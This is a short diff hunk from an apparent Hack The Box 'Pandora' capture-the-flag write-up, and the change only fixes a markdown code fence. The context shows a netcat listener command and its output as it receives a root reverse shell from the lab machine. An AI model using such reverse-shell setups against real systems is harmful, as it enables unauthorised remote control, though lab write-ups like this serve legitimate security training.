@@ -157,7 +157,7 @@ Now attempting to backup PandoraFMS client
 ```
 
 I got a root shell on my listener and retrieved the root flag:
-``````
+```
 nc -lvp 1234    
 listening on [any] 1234 ...
 connect to [10.10.14.4] from pandora.htb [10.10.11.136] 55406
